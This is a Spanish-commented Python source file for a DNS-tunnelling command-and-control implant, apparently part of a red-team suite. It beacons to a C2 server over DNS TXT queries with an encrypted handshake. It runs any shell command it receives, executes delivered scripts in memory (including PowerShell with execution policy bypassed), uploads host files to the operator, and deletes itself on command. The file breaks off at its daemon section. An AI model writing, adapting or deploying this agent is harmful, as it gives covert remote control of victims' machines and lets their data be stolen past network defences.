#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════╗
# ║  BlackBerryCDNS.py  —  DNS C2 Bridge Agent  v2.1               ║
# ║  BlackBerry C2 Suite  |  Solo para entornos autorizados         ║
# ╠══════════════════════════════════════════════════════════════════╣
# ║  Transporte  : UDP / DNS  (queries TXT base32)                  ║
# ║  Protocolo   : Relay transparente al backend C2 vía proxy DNS   ║
# ║  Seguridad   : ECDHE P-256 + AES-256-GCM + HMAC-SHA256         ║
# ║                (handshake end-to-end agente ↔ backend)          ║
# ╠══════════════════════════════════════════════════════════════════╣
# ║  Flujo                                                          ║
# ║   h1 → proxy → REQUEST_PUBKEY → backend → ECDH_PUBKEY          ║
# ║   h2 → [4B len][PEM][32B HMAC] → backend                       ║
# ║   dt → [4B len][AES-GCM]  →  backend TCP (raw relay)           ║
# ║   po → sondeo  ← [4B len][AES-GCM] ← backend TCP              ║
# ║   hb → keepalive TCP en proxy                                   ║
# ╠══════════════════════════════════════════════════════════════════╣
# ║  Uso: python BlackBerryCDNS.py -H <ip> [-d <dominio>]          ║
# ║       [--hmac <secret>] [--daemon] [--poll 3] [--jitter 5]     ║
# ║  Requisitos: pip install dnslib cryptography                    ║
# ╚══════════════════════════════════════════════════════════════════╝

import os, sys, socket, struct, time, threading, hashlib
import base64, zlib, logging, argparse, signal, subprocess
import secrets, getpass, platform, random
from collections import deque

# ── Dependencias ──────────────────────────────────────────────────────────────
try:
    import dnslib
except ImportError:
    sys.exit("[!] pip install dnslib")

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives             import serialization, hashes
    from cryptography.hazmat.primitives.asymmetric  import ec
    from cryptography.hazmat.primitives.kdf.hkdf    import HKDF
    from cryptography.hazmat.primitives.serialization import load_pem_public_key
    import hmac as _hmac
except ImportError:
    sys.exit("[!] pip install cryptography")

# ══════════════════════════════════════════════════════════════════════════════
#  CONFIGURACIÓN  (editar aquí o usar argumentos CLI)
# ══════════════════════════════════════════════════════════════════════════════
DNS_SERVER       = "127.0.0.1"
DNS_PORT         = 53
C2_DOMAIN        = "beacon.local"
HMAC_PRE_SHARED  = b"BlackBerryC2-HMACSecret"

POLL_INTERVAL    = 1.0    # s entre polls normales
HB_INTERVAL      = 60     # s entre heartbeats (más frecuente para detectar caídas)
RECONNECT_BASE   = 10     # s base de reconexión
RECONNECT_JITTER = 8      # s máximo de jitter aleatorio
DNS_TIMEOUT      = 8.0    # s timeout por query UDP
DNS_RETRIES      = 3
LABEL_MAX        = 56     # chars base32 por label DNS (<63)
FRAG_BYTES       = 100    # bytes por fragmento de query
MAX_RESULT_BYTES = 512 * 1024
EXEC_TIMEOUT     = 60
DAEMON_MODE      = False
DEBUG            = False

# ── Identidad del agente (fija para esta instancia) ───────────────────────────
_HOSTNAME  = socket.gethostname()
try:
    _USER  = getpass.getuser()
except Exception:
    _USER  = os.environ.get("USER", os.environ.get("USERNAME", "agent"))

# ── Referencia a la sesión activa (para que _exec pueda enviar FILE_CHUNK) ───
_sess_ref: list = [None]   # [BackendSession | None]

# ── Secuencia anti-replay ─────────────────────────────────────────────────────
_seq_lock = threading.Lock()
_seq      = 0
def _next_seq() -> int:
    global _seq
    with _seq_lock:
        _seq += 1
        return _seq

# ── Logger ────────────────────────────────────────────────────────────────────
def _log(msg: str):
    if not DAEMON_MODE:
        print(f"[*] {msg}")
    if DEBUG:
        logging.debug(msg)

logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.WARNING,
    format="%(asctime)s %(message)s"
)

# ── Jitter de reconexión ──────────────────────────────────────────────────────
def _reconnect_wait():
    delay = RECONNECT_BASE + random.uniform(0, RECONNECT_JITTER)
    _log(f"Reconectando en {delay:.1f}s...")
    time.sleep(delay)


# ══════════════════════════════════════════════════════════════════════════════
#  CRYPTO DEL BACKEND  (wire format idéntico a BlackBerryCHTTPs)
# ══════════════════════════════════════════════════════════════════════════════
def _enc(aes_key: bytes, plaintext: bytes) -> bytes:
    """[4B len][8B seq][1B flag][12B nonce][cipher][32B HMAC]"""
    flag, payload = 0, plaintext
    if len(plaintext) > 200:
        try:
            c = zlib.compress(plaintext, 6)
            if len(c) < len(plaintext):
                payload, flag = c, 1
        except Exception:
            pass
    nonce  = os.urandom(12)
    cipher = AESGCM(aes_key).encrypt(nonce, payload, None)
    seq    = struct.pack("!Q", _next_seq())
    htag   = _hmac.new(aes_key, seq + nonce + cipher, hashlib.sha256).digest()
    body   = seq + bytes([flag]) + nonce + cipher + htag
    return struct.pack("!I", len(body)) + body


def _dec(aes_key: bytes, data: bytes):
    """Descifra [4B len][body]. Retorna plaintext (bytes) o None."""
    try:
        if len(data) < 4:
            return None
        msg_len = struct.unpack("!I", data[:4])[0]
        if msg_len == 0 or len(data) < 4 + msg_len:
            return None
        pkt    = data[4:4 + msg_len]
        if len(pkt) < 53:
            return None
        seq    = pkt[0:8]
        flag   = pkt[8]
        nonce  = pkt[9:21]
        htag   = pkt[-32:]
        cipher = pkt[21:-32]
        exp    = _hmac.new(aes_key, seq + nonce + cipher, hashlib.sha256).digest()
        if not _hmac.compare_digest(htag, exp):
            _log("  HMAC inválido — posible MITM")
            return None
        plain = AESGCM(aes_key).decrypt(nonce, cipher, None)
        if flag == 1:
            plain = zlib.decompress(plain)
        return plain
    except Exception as e:
        _log(f"  decrypt error: {e}")
        return None


# ══════════════════════════════════════════════════════════════════════════════
#  TRANSPORTE DNS
# ══════════════════════════════════════════════════════════════════════════════
def _b32e(data: bytes) -> str:
    return base64.b32encode(data).decode().lower().rstrip("=")

def _b32d(s: str) -> bytes:
    s = s.upper()
    s += "=" * ((8 - len(s) % 8) % 8)
    return base64.b32decode(s)

def _pack_labels(data: bytes) -> list:
    enc = _b32e(data)
    return [enc[i:i+LABEL_MAX] for i in range(0, len(enc), LABEL_MAX)]

def _unpack_txts(records: list) -> bytes:
    """TXT records base32 del proxy → bytes raw."""
    if not records:
        return b""
    raw = "".join(
        r.decode(errors="ignore") if isinstance(r, bytes) else r
        for r in records
    ).replace(" ", "")
    if raw.upper() in ("WAIT", "ACK", "OK", "HB_ACK", "NXDOMAIN", ""):
        return b""
    try:
        return _b32d(raw)
    except Exception:
        return b""

def _txt_kw(records: list) -> str:
    """Primer keyword TXT en mayúsculas."""
    if records:
        r = records[0]
        if isinstance(r, bytes):
            r = r.decode(errors="ignore")
        return r.strip().upper()
    return ""


class _DNSTr:
    """Transporte DNS: build qname → query UDP → parse TXT."""

    def __init__(self, server, port, domain):
        self.server = server
        self.port   = port
        self.domain = domain.rstrip(".")
        self.sid    = secrets.token_hex(4)
        self._lock  = threading.Lock()
        self._sock  = self._mk_sock()

    def _mk_sock(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(DNS_TIMEOUT)
        return s

    def _qname(self, op, cn, ct, labels=None) -> str:
        parts = [f"{op}{cn:02x}{ct:02x}", self.sid]
        parts += labels if labels else ["x"]
        parts.append(self.domain)
        return ".".join(parts)

    def query(self, qname: str, timeout=None, retries=None) -> list | None:
        t = timeout or DNS_TIMEOUT
        r = retries or DNS_RETRIES
        pkt = dnslib.DNSRecord.question(qname, "TXT").pack()
        for attempt in range(r):
            try:
                with self._lock:
                    self._sock.settimeout(t)
                    self._sock.sendto(pkt, (self.server, self.port))
                    raw, _ = self._sock.recvfrom(8192)
                resp = dnslib.DNSRecord.parse(raw)
                if resp.header.rcode == 3:
                    return None
                txts = []
                for rr in resp.rr:
                    if rr.rtype == dnslib.QTYPE.TXT:
                        for part in rr.rdata.data:
                            txts.append(
                                part.decode(errors="ignore")
                                if isinstance(part, bytes) else part
                            )
                return txts
            except socket.timeout:
                _log(f"  timeout qname={qname[:40]} intento={attempt+1}")
                time.sleep(0.4 * (attempt + 1))
            except Exception as e:
                _log(f"  query error: {e}")
                time.sleep(0.3)
        return None

    def send_chunks(self, op: str, data: bytes) -> list | None:
        """
        Fragmenta data en FRAG_BYTES y envía cn=0..ct-1.
        Fragmentos intermedios reciben ACK del proxy.
        Último fragmento recibe el resultado real.
        """
        chunks = [data[i:i+FRAG_BYTES] for i in range(0, len(data), FRAG_BYTES)]
        ct = len(chunks)
        for cn, chunk in enumerate(chunks):
            labels = _pack_labels(chunk)
            qname  = self._qname(op, cn, ct, labels)
            recs   = self.query(qname)
            if recs is None:
                _log(f"  send_chunks timeout cn={cn}/{ct} op={op}")
                return None
            if cn < ct - 1:
                kw = _txt_kw(recs)
                if kw not in ("ACK", ""):
                    _log(f"  send_chunks error intermedio cn={cn}/{ct}: {recs[:2]}")
                    return None
        return recs  # respuesta del último fragmento

    def send_bare(self, op: str) -> list | None:
        return self.query(self._qname(op, 0, 1))

    def close(self):
        try: self._sock.close()
        except Exception: pass


# ══════════════════════════════════════════════════════════════════════════════
#  SESIÓN DEL BACKEND
# ══════════════════════════════════════════════════════════════════════════════
class BackendSession:
    def __init__(self, tr: _DNSTr):
        self.tr      = tr
        self.aes_key = None
        self._rx_buf = b""
        self._rx_lk  = threading.Lock()
        # Flag para señalar al poll worker que la conexión se perdió
        self._dead   = threading.Event()

    # ── Phase 1 ──────────────────────────────────────────────────────────────
    def _ph1(self) -> bytes | None:
        _log("Phase 1 — solicitando ECDH_PUBKEY al backend...")
        for attempt in range(6):
            recs = self.tr.send_bare("h1")
            if recs is not None:
                raw = _unpack_txts(recs)
                if raw and raw.startswith(b"ECDH_PUBKEY:"):
                    _log(f"  ECDH_PUBKEY recibida ({len(raw)}B)")
                    return raw
                _log(f"  h1 resp inesperada: {(recs or [])[:2]}")
                return None
            _log(f"  h1 sin resp — reintento {attempt+1}/6")
            time.sleep(2 + attempt)
        return None

    # ── Phase 2 ──────────────────────────────────────────────────────────────
    def _ph2(self, pub_resp: bytes) -> bool:
        _log("Phase 2 — ECDHE key exchange...")
        srv_pem = pub_resp[len(b"ECDH_PUBKEY:"):]
        try:
            srv_pub = load_pem_public_key(srv_pem)
        except Exception as e:
            _log(f"  PEM inválido: {e}")
            return False

        cli_priv = ec.generate_private_key(ec.SECP256R1())
        cli_pem  = cli_priv.public_key().public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        shared   = cli_priv.exchange(ec.ECDH(), srv_pub)
        aes_key  = HKDF(
            algorithm=hashes.SHA256(), length=32,
            salt=None, info=b"BlackBerryC2_AES_KEY",
        ).derive(shared)
        hmac_tag = _hmac.new(HMAC_PRE_SHARED, shared, hashlib.sha256).digest()
        payload  = struct.pack("!I", len(cli_pem)) + cli_pem + hmac_tag

        recs = self.tr.send_chunks("h2", payload)
        if recs is None:
            _log("  h2: sin respuesta")
            return False
        if _txt_kw(recs) == "OK":
            self.aes_key = aes_key
            _log("[+] Handshake completado — canal E2E activo")
            return True
        _log(f"  h2 resp inesperada: {(recs or [])[:2]}")
        return False

    # ── Connect ───────────────────────────────────────────────────────────────
    def connect(self) -> bool:
        pub = self._ph1()
        if not pub:
            return False
        return self._ph2(pub)

    # ── Send ──────────────────────────────────────────────────────────────────
    def send(self, data) -> bool:
        if not self.aes_key:
            return False
        if isinstance(data, str):
            data = data.encode("utf-8", errors="replace")
        framed = _enc(self.aes_key, data)
        recs   = self.tr.send_chunks("dt", framed)
        if recs is None:
            self._mark_dead()
            return False
        if _txt_kw(recs) == "ACK":
            return True
        # NXDOMAIN = proxy perdió la conexión TCP al backend
        _log(f"  dt resp inesperada: {(recs or [])[:2]} — posible pérdida de backend")
        self._mark_dead()
        return False

    # ── Poll ──────────────────────────────────────────────────────────────────
    # Status codes para poll
    POLL_DATA    = "data"     # hay datos del backend
    POLL_WAIT    = "wait"     # proxy vivo, sin comandos
    POLL_TIMEOUT = "timeout"  # UDP sin respuesta (red)
    POLL_DEAD    = "dead"     # backend TCP caído

    def poll_raw(self):
        """
        Retorna (bytes, status):
          (data_bytes, POLL_DATA)    → datos del backend
          (None,       POLL_WAIT)    → proxy vivo, sin comandos pendientes
          (None,       POLL_TIMEOUT) → UDP timeout (posible pérdida puntual)
          (None,       POLL_DEAD)    → backend TCP caído, reconectar
        """
        recs = self.tr.send_bare("po")
        if recs is None:
            return None, BackendSession.POLL_TIMEOUT
        kw = _txt_kw(recs)
        if kw in ("WAIT", ""):
            return None, BackendSession.POLL_WAIT
        if kw == "NXDOMAIN":
            _log("  po → NXDOMAIN — backend TCP caído")
            self._mark_dead()
            return None, BackendSession.POLL_DEAD
        data = _unpack_txts(recs)
        if data:
            return data, BackendSession.POLL_DATA
        return None, BackendSession.POLL_WAIT

    def _try_frame(self) -> bytes | None:
        if len(self._rx_buf) < 4:
            return None
        msg_len = struct.unpack("!I", self._rx_buf[:4])[0]
        if msg_len == 0:
            self._rx_buf = self._rx_buf[4:]
            return None
        if len(self._rx_buf) < 4 + msg_len:
            return None
        frame        = self._rx_buf[:4 + msg_len]
        self._rx_buf = self._rx_buf[4 + msg_len:]
        return _dec(self.aes_key, frame)

    # ── Heartbeat ─────────────────────────────────────────────────────────────
    def heartbeat(self) -> bool:
        """
        Verifica que el canal siga vivo.
        NXDOMAIN = proxy detectó que el TCP al backend murió → marcar dead.
        """
        recs = self.tr.send_bare("hb")
        if recs is None:
            # UDP timeout puntual — no matar todavía
            _log("  HB UDP timeout")
            return False
        kw = _txt_kw(recs)
        if kw == "HB_ACK":
            return True
        if kw == "NXDOMAIN":
            _log("  HB → NXDOMAIN — backend TCP caído, reconectando...")
            self._mark_dead()
        return False

    def _mark_dead(self):
        self._dead.set()

    def ready(self) -> bool:
        return self.aes_key is not None and not self._dead.is_set()

    def rehandshake(self) -> bool:
        """
        Re-autenticación ECDHE en caliente sin reiniciar el proceso.
        Genera nuevo SID → Ph1 → Ph2 → si OK limpia _dead y _rx_buf.
        Si falla 3 intentos activa _dead para reconexión completa.
        """
        import secrets as _sec
        _log("[~] Re-handshake en caliente iniciado...")
        old_sid      = self.tr.sid
        self.tr.sid  = _sec.token_hex(4)
        self.aes_key = None
        with self._rx_lk:
            self._rx_buf = b""
        for attempt in range(3):
            try:
                pub = self._ph1()
                if pub and self._ph2(pub):
                    self._dead.clear()
                    _log(f"[+] Re-handshake OK — SID={self.tr.sid} (ant={old_sid})")
                    return True
            except Exception as e:
                _log(f"  rehandshake intento {attempt+1}/3: {e}")
            time.sleep(2)
        _log("[!] Re-handshake fallido — forzando reconexión completa")
        self.tr.sid = old_sid
        self._mark_dead()
        return False


# ══════════════════════════════════════════════════════════════════════════════
#  EJECUCIÓN DE COMANDOS
# ══════════════════════════════════════════════════════════════════════════════
# ── CWD persistente del proceso ──────────────────────────────────────────────
_cwd = os.getcwd()

def _chdir(path: str) -> str:
    global _cwd
    try:
        target = os.path.expanduser(path) if path.startswith("~") else path
        if not os.path.isabs(target):
            target = os.path.join(_cwd, target)
        target = os.path.realpath(target)
        os.chdir(target)
        _cwd = os.getcwd()
        return f"[+] {_cwd}"
    except Exception as e:
        return f"[!] cd: {e}"


# ── Ejecución en memoria (fileless) ───────────────────────────────────────────
def _exec_in_memory(file_bytes: bytes, file_name: str) -> tuple[bool, str]:
    """
    Ejecuta el script recibido en memoria sin escribirlo a disco.
    Soporta: .py .sh .bash .pl .rb .php .js .lua .zsh .ps1
    """
    import gc
    ext = os.path.splitext(file_name)[1].lower()

    interpreters = {
        ".py":   ["python3", "-c"],
        ".sh":   ["bash",    "-c"],
        ".bash": ["bash",    "-c"],
        ".zsh":  ["zsh",     "-c"],
        ".pl":   ["perl",    "-e"],
        ".rb":   ["ruby",    "-e"],
        ".php":  ["php",     "-r"],
        ".js":   ["node",    "-e"],
        ".lua":  ["lua",     "-e"],
        ".ps1":  ["pwsh",    "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"],
    }

    code_str = file_bytes.decode("utf-8", errors="replace")
    cmd_base = interpreters.get(ext, ["bash", "-c"])

    # Python: ejecutar en el mismo proceso (fileless total)
    if ext == ".py":
        try:
            from io import StringIO
            old_stdout, old_stderr = sys.stdout, sys.stderr
            sys.stdout = sys.stderr = cap = StringIO()
            ns = {"__builtins__": __builtins__, "__name__": "__main__",
                  "__file__": "<memory>"}
            try:
                exec(compile(code_str, "<memory>", "exec"), ns)
                out = cap.getvalue()
                return True, out if out else "[OK] Sin salida"
            except SystemExit as e:
                return True, f"[exit {e.code}]\n{cap.getvalue()}"
            except Exception as e:
                return False, f"[!] {type(e).__name__}: {e}\n{cap.getvalue()}"
            finally:
                sys.stdout, sys.stderr = old_stdout, old_stderr
                del ns
                gc.collect()
        except Exception as e:
            return False, f"[!] Error python: {e}"

    # Otros lenguajes: subprocess con código pasado como argumento -c/-e
    try:
        proc = subprocess.Popen(
            cmd_base + [code_str],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            cwd=_cwd,
        )
        try:
            out, _ = proc.communicate(timeout=EXEC_TIMEOUT)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, _ = proc.communicate()
            out += b"\n[!] Timeout"
        result = out.decode("utf-8", errors="replace")
        return proc.returncode == 0, result
    except FileNotFoundError:
        return False, f"[!] Intérprete no encontrado: {cmd_base[0]}"
    except Exception as e:
        return False, f"[!] {e}"


# ── Recepción de archivo del servidor ─────────────────────────────────────────
# Estado global para la recepción de archivos en curso
_pending_file: dict | None = None   # {"size": int, "sha": str, "data": bytes}

def _handle_size_header(header: str, sess) -> str:
    """
    Inicia la recepción de un archivo.
    Protocolo: servidor envía 'SIZE <bytes> <sha256>'
    El cliente sondea con 'FILE_CHUNK' para pedir cada chunk.
    """
    global _pending_file
    try:
        parts   = header.split()
        size    = int(parts[1])
        sha256  = parts[2]
        _pending_file = {"size": size, "sha": sha256, "data": b""}
        _log(f"  Iniciando recepción de archivo: {size}B")
        # Pedir el primer chunk
        ok = sess.send("FILE_CHUNK")
        return ""   # No enviar nada al backend todavía — esperamos chunks
    except Exception as e:
        _pending_file = None
        return f"[ERROR] SIZE header inválido: {e}"

def _handle_file_chunk(chunk_bytes: bytes, sess) -> str:
    """Acumula un chunk del archivo. Pide el siguiente o termina si está completo."""
    global _pending_file
    if _pending_file is None:
        return ""
    _pending_file["data"] += chunk_bytes
    received = len(_pending_file["data"])
    total    = _pending_file["size"]
    _log(f"  Chunk recibido: {received}/{total}B")
    if received < total:
        # Pedir siguiente chunk
        sess.send("FILE_CHUNK")
        return ""
    # Archivo completo — verificar integridad
    import hashlib as _hl
    actual = _hl.sha256(_pending_file["data"]).hexdigest()
    if actual != _pending_file["sha"]:
        data = _pending_file
        _pending_file = None
        return "[ERROR] Fallo de integridad del archivo"
    # Listo — PUT_FILE vendrá en el próximo mensaje del servidor
    return ""  # Esperar PUT_FILE


def _exec(cmd_bytes: bytes) -> str:
    """
    Despacha un mensaje del backend al handler correcto.
    Retorna la respuesta a enviar de vuelta, o "" para no enviar nada.
    """
    global _pending_file
    try:
        cmd = cmd_bytes.decode("utf-8", errors="replace").strip()
    except Exception:
        return "[!] Comando no decodificable"

    _log(f"  cmd: {cmd[:80]}")
    if not cmd:
        return ""

    # ── Identidad ─────────────────────────────────────────────────────────────
    if cmd == "GET_HOSTNAME":    return _HOSTNAME
    if cmd == "GET_USER":        return _USER
    if cmd == "GET_OS":          return platform.platform()
    if cmd == "GET_PID":         return str(os.getpid())
    if cmd == "GET_CAPABILITIES":
        return "CAPS:dns-bridge,zlib,ecdhe,hmac,py,sh,pl,rb,php,js,lua,ps1"
    if cmd == "GET_CWD":         return _cwd
    if cmd == "PWD":             return _cwd

    # ── cd persistente ────────────────────────────────────────────────────────
    if cmd.startswith("cd ") or cmd.startswith("CD "):
        return _chdir(cmd.split(maxsplit=1)[1])

    # ── Recepción de archivo (iniciada por el servidor con SIZE header) ───────
    if cmd.startswith("SIZE "):
        # Necesitamos la sesión para enviar FILE_CHUNK — se pasa via _sess_ref
        if _sess_ref[0] is not None:
            return _handle_size_header(cmd, _sess_ref[0])
        return "[ERROR] Sin sesión activa para FILE_CHUNK"

    # ── PUT_FILE: ejecutar o guardar el archivo que llegó previamente ─────────
    if cmd.startswith("PUT_FILE "):
        parts     = cmd.split()
        file_name = parts[1] if len(parts) > 1 else "received"
        execute   = "-exc" in parts

        if _pending_file is None:
            return "[ERROR] PUT_FILE sin datos — no se recibió SIZE header previo"

        file_data     = _pending_file["data"]
        _pending_file = None

        if execute:
            _log(f"  Ejecutando en memoria: {file_name} ({len(file_data)}B)")
            ok, out = _exec_in_memory(file_data, file_name)
            if len(out) > MAX_RESULT_BYTES:
                out = out[:MAX_RESULT_BYTES] + f"\n[... truncado]"
            prefix = "[SUCCESS]" if ok else "[ERROR]"
            return f"{prefix} '{file_name}' ejecutado:\n{out}"
        else:
            # Guardar en el directorio actual
            save_path = os.path.join(_cwd, os.path.basename(file_name))
            try:
                with open(save_path, "wb") as f:
                    f.write(file_data)
                return f"[SUCCESS] Archivo '{os.path.basename(file_name)}' guardado ({len(file_data)}B)"
            except Exception as e:
                return f"[ERROR] No se pudo guardar: {e}"

    # ── FILE_EXISTS / FILE_SIZE (requeridos por el servidor en transferencias) ─
    if cmd.startswith("FILE_EXISTS "):
        path = cmd.split(maxsplit=1)[1].strip()
        if os.path.isfile(path):
            return f"FILE_EXISTS:YES:{os.path.getsize(path)}"
        return "FILE_NOT_FOUND"

    if cmd.startswith("FILE_SIZE "):
        path = cmd.split(maxsplit=1)[1].strip()
        try:
            return f"FILE_SIZE:{os.path.getsize(path)}"
        except Exception:
            return "FILE_SIZE:0"

    # ── Transferencia de archivos (get/upload desde el agente) ────────────────
    if cmd.startswith("UPLOAD "):
        path = cmd[7:].strip()
        try:
            with open(path, "rb") as f:
                return "FILE_DATA:" + base64.b64encode(f.read()).decode()
        except Exception as e:
            return f"[!] {e}"

    if cmd.startswith("WRITE_FILE "):
        parts = cmd[11:].split(" ", 1)
        if len(parts) < 2:
            return "[!] Uso: WRITE_FILE <ruta> <b64>"
        try:
            decoded = base64.b64decode(parts[1])
            dest = os.path.join(_cwd, parts[0])
            with open(dest, "wb") as f:
                f.write(decoded)
            return f"[+] Escrito {len(decoded)}B en {dest}"
        except Exception as e:
            return f"[!] {e}"

    # ── Autodestrucción ───────────────────────────────────────────────────────
    if cmd == "auto-destroy":
        try: os.remove(os.path.abspath(__file__))
        except Exception: pass
        os.kill(os.getpid(), signal.SIGTERM)
        return ""

    # ── Shell ─────────────────────────────────────────────────────────────────
    try:
        env = os.environ.copy()
        env["TERM"] = "dumb"
        proc = subprocess.Popen(
            cmd,
            shell=True,
            executable="/bin/sh",
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            env=env,
            cwd=_cwd,
        )
        try:
            out, _ = proc.communicate(timeout=EXEC_TIMEOUT)
        except subprocess.TimeoutExpired:
            proc.kill()
            try:
                out, _ = proc.communicate(timeout=3)
            except Exception:
                out = b""
            out += b"\n[!] Timeout"
        result = out.decode("utf-8", errors="replace")
        if len(result) > MAX_RESULT_BYTES:
            result = result[:MAX_RESULT_BYTES] + f"\n[!] Truncado"
        # Siempre retornar algo — el servidor espera respuesta y se bloquea si no llega
        return result if result.strip() else "[OK]"
    except Exception as e:
        return f"[!] Error ejecutando '{cmd}': {e}"


# ══════════════════════════════════════════════════════════════════════════════
#  WORKERS
# ══════════════════════════════════════════════════════════════════════════════
def _hb_worker(sess: BackendSession, stop: threading.Event):
    """
    Heartbeat periódico.
    - UDP timeout → fallo transitorio, toleramos muchos seguidos
    - NXDOMAIN    → backend TCP confirmado muerto → reconectar
    La sesión solo se marca dead si el proxy explícitamente devuelve NXDOMAIN
    (lo que ocurre cuando el reader thread detecta que el TCP al C2 se cerró).
    """
    hb_fails     = 0
    MAX_HB_FAILS = 2   # fallos UDP antes de intentar re-handshake

    while not stop.is_set() and not sess._dead.is_set():
        for _ in range(HB_INTERVAL):
            if stop.is_set() or sess._dead.is_set():
                return
            time.sleep(1)

        if stop.is_set() or sess._dead.is_set():
            return

        ok = sess.heartbeat()
        if ok:
            hb_fails = 0
            _log("  HB: OK")
        elif sess._dead.is_set():
            return   # NXDOMAIN — _mark_dead ya llamado en heartbeat()
        else:
            hb_fails += 1
            _log(f"  HB: UDP fallo {hb_fails}/{MAX_HB_FAILS}")
            if hb_fails >= MAX_HB_FAILS:
                hb_fails = 0
                if not sess.rehandshake():
                    return   # rehandshake() activó _dead


def _poll_worker(sess: BackendSession, stop: threading.Event):
    """
    Bucle principal: po → descifrar → ejecutar → dt resultado.

    Distinción de estados:
      POLL_DATA    → ejecutar + enviar resultado → fast-poll inmediato
      POLL_WAIT    → proxy vivo, sin comandos → esperar POLL_INTERVAL
      POLL_TIMEOUT → UDP fallo puntual → acumular, cortar si hay muchos seguidos
      POLL_DEAD    → backend TCP caído → señalar _dead → run() reconecta
    """
    _log("[+] Poll worker iniciado")

    # UDP timeouts:
    #  1 .. REAUTH_AFTER  → backoff suave (no desconecta)
    #  REAUTH_AFTER       → re-handshake ECDHE en caliente (nuevo SID+ECDHE)
    #  re-handshake falla → _dead → run() reconecta completamente
    udp_fail_count  = 0
    REAUTH_AFTER    = 8    # fallos UDP consecutivos → re-handshake
    UDP_BACKOFF_MAX = 4.0  # s máximo de backoff entre polls
    FAST_POLL_SECS  = 6.0
    fast_poll_until = 0.0

    while not stop.is_set() and not sess._dead.is_set():
        try:
            raw, status = sess.poll_raw()

            if status == BackendSession.POLL_DEAD:
                break

            if status == BackendSession.POLL_TIMEOUT:
                udp_fail_count += 1
                backoff = min(POLL_INTERVAL * (1 + udp_fail_count * 0.3), UDP_BACKOFF_MAX)
                _log(f"  UDP fallo {udp_fail_count}/{REAUTH_AFTER} — backoff {backoff:.1f}s")

                if udp_fail_count >= REAUTH_AFTER:
                    _log("[~] Demasiados fallos UDP — re-handshake en caliente...")
                    udp_fail_count = 0
                    if not sess.rehandshake():
                        break
                    _log("[+] Re-handshake OK — reanudando polling")
                    fast_poll_until = time.time() + FAST_POLL_SECS
                    continue

                time.sleep(backoff)
                continue

            # POLL_WAIT / POLL_DATA — proxy vivo → resetear contador
            udp_fail_count = 0

            if status == BackendSession.POLL_WAIT or raw is None:
                # Sin comandos — esperar normal o fast-poll si estamos en modo rápido
                sleep_t = 0.3 if time.time() < fast_poll_until else POLL_INTERVAL
                time.sleep(sleep_t)
                continue

            # ── Hay datos (POLL_DATA) ────────────────────────────────────────
            fast_poll_until = time.time() + FAST_POLL_SECS  # activar fast-poll

            # Acumular y descifrar frame
            with sess._rx_lk:
                sess._rx_buf += raw
                plain = sess._try_frame()

            # Frame puede fragmentarse en varios polls (mensaje grande)
            if plain is None:
                for _ in range(20):
                    if stop.is_set() or sess._dead.is_set():
                        break
                    time.sleep(0.2)
                    raw2, st2 = sess.poll_raw()
                    if st2 == BackendSession.POLL_DEAD:
                        sess._mark_dead()
                        break
                    if raw2:
                        with sess._rx_lk:
                            sess._rx_buf += raw2
                            plain = sess._try_frame()
                        if plain is not None:
                            break

            if plain is None:
                _log("  Frame incompleto tras acumulación — descartando buffer")
                with sess._rx_lk:
                    sess._rx_buf = b""
                continue

            # ── Ejecutar y devolver resultado ────────────────────────────────
            cmd_str = plain.decode("utf-8", errors="replace").strip()
            result  = _exec(plain)
            # SIZE header: el agente envía FILE_CHUNK internamente, no responder aquí
            if cmd_str.startswith("SIZE "):
                fast_poll_until = time.time() + FAST_POLL_SECS
                continue

            # SIEMPRE enviar respuesta — el servidor espera una tras cada comando.
            # Comandos sin salida (clear, tput, etc.) envían "\n".
            reply = result if result else "\n"
            ok = sess.send(reply)
            _log(f"  resultado {len(reply)}B → dt={'OK' if ok else 'FAIL'}")
            # Volver a fast-poll inmediatamente tras ejecutar
            fast_poll_until = time.time() + FAST_POLL_SECS

        except Exception as e:
            _log(f"  poll worker error: {e}")
            time.sleep(POLL_INTERVAL)

    _log("  Poll worker terminado")


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN LOOP — siempre conectado, jitter en reconexión
# ══════════════════════════════════════════════════════════════════════════════
def run():
    if not DAEMON_MODE:
        print("=" * 58)
        print(f"  BlackBerry DNS Bridge Agent  v2.1")
        print(f"  Proxy  : {DNS_SERVER}:{DNS_PORT}  ({C2_DOMAIN})")
        print(f"  Host   : {_HOSTNAME}  |  User: {_USER}")
        print(f"  Poll   : {POLL_INTERVAL}s  |  HB: {HB_INTERVAL}s")
        print(f"  Recon  : {RECONNECT_BASE}s + jitter(0-{RECONNECT_JITTER}s)")
        print("=" * 58)

    while True:
        tr   = None
        sess = None
        stop = threading.Event()
        ths  = []

        try:
            tr   = _DNSTr(DNS_SERVER, DNS_PORT, C2_DOMAIN)
            sess = BackendSession(tr)
            _log(f"Conectando — SID={tr.sid}")

            if not sess.connect():
                _log("Handshake falló")
                _reconnect_wait()
                continue

            if not DAEMON_MODE:
                print(f"[+] Canal activo | SID={tr.sid}")

            # ── Anunciar identidad al backend ─────────────────────────────────
            _sess_ref[0] = sess
            sess.send(_HOSTNAME)

            # ── Lanzar workers ────────────────────────────────────────────────
            for fn in (_hb_worker, _poll_worker):
                t = threading.Thread(target=fn, args=(sess, stop), daemon=True)
                t.start()
                ths.append(t)

            # ── Esperar a que la sesión muera (workers señalan sess._dead) ────
            while not stop.is_set():
                if sess._dead.is_set():
                    _log("Sesión perdida — reconectando...")
                    stop.set()
                    break
                time.sleep(1)

        except KeyboardInterrupt:
            _log("[+] Detenido por usuario")
            stop.set()
            # Limpiar y salir
            for t in ths:
                t.join(timeout=2)
            if tr:
                tr.close()
            sys.exit(0)

        except Exception as e:
            _log(f"Error inesperado: {e}")

        finally:
            _sess_ref[0] = None
            stop.set()
            if tr:
                tr.close()
            for t in ths:
                t.join(timeout=2)

        _reconnect_wait()


# ══════════════════════════════════════════════════════════════════════════════
#  MODO DAEMON
